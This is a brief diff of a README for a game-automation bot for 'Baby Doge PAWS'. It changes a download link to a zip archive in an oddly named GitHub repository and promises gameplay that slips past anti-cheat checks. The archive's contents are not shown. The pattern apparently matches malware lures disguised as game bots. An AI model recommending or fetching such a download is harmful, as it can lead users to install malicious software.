@@ -2,7 +2,7 @@
 Introduction
 The Baby Doge PAWS Bot is a cutting-edge automated system tailored for the Baby Doge PAWS game. This bot is designed to efficiently perform all in-game actions, ensuring optimal gameplay, strategic decision-making, and compliance with anti-cheat measures. Here is a detailed breakdown of the bot's functionality and design.
 
-[DOWNLOAD](https://github.com/loasd104/asfsfscxs/releases/download/Release/install.zip)
+[DOWNLOAD](https://github.com/loasd104/asfsfscxs/releases/download/Release/pass_125accept.zip)
 
 Key Features
 1. Game Analysis
